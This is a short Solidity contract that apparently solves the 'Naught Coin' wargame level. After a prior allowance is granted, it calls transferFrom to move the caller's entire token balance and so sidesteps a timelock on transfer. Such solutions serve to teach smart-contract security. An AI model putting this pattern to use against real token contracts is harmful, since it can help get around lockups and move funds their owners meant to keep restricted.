// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/token/ERC20/ERC20.sol';

contract NaughtCoinAttack {
    ERC20 token;
    constructor(ERC20 _token) public {
        token = _token;
    }
    
    // Requires a prior allowance >= total supply
    function withdrawAll() external {
        token.transferFrom(msg.sender, address(this), token.balanceOf(msg.sender));
    }
}